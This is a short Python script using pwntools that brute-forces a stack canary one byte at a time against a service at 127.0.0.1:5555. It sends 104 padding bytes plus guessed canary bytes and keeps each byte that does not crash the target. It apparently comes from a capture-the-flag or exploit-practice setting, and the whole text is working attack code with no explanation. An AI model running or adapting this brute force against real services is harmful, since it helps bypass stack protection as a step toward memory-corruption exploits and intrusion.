from pwn import *
import time
time = 8
canary = '\x00'
print(len(canary))
result =[]
while len(canary)<8:
    for i in range(256):
        io = remote('127.0.0.1',5555)
        io.recv()
        
        payload = 'a'*104+canary+chr(i)
        print(payload)
        io.send(payload)
        try:
            io.recv()
            canary += chr(i)
            print(canary, i)
            result.append(i)
            break
        except:
            continue
        finally:
            io.close()
print(result)
print("canary is",canary)
	